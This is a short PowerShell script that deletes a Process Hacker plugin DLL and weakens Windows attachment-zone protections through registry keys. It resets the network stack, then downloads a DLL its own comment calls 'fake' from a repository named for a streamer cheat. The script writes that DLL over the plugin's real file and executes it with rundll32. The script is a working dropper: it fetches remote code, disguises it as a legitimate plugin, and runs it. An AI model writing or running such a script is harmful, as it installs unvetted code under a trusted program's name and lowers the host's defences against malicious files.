# Remove old plugin DLL silently
Remove-Item "C:\Program Files\Process Hacker 2\plugins\ExtendedNotifications.dll" -Force -ErrorAction SilentlyContinue

# Set attachment policy registry keys
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" -Name "SaveZoneInformation" -Value 2 -Type DWord
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" -Name "ScanWithAntiVirus" -Value 2 -Type DWord

# Restart active network adapters
Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | Restart-NetAdapter -Confirm:$false

# Reset IP stack and flush DNS
netsh int ip reset
netsh winsock reset
ipconfig /flushdns

# Start WLAN service if it's not already running
Get-Service WlanSvc | Start-Service

# Show current network adapter info
Get-NetAdapter | Format-Table Name, Status, InterfaceDescription

# Force group policy update
gpupdate /force

# Download fake DLL and place it in the plugins folder
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ExtendedNotificationsFake.dll" -OutFile "C:\Program Files\Process Hacker 2\plugins\ExtendedNotifications.dll"

# Run the DLL using rundll32
Start-Process rundll32.exe -ArgumentList '"C:\Program Files\Process Hacker 2\plugins\ExtendedNotifications.dll",cmd'
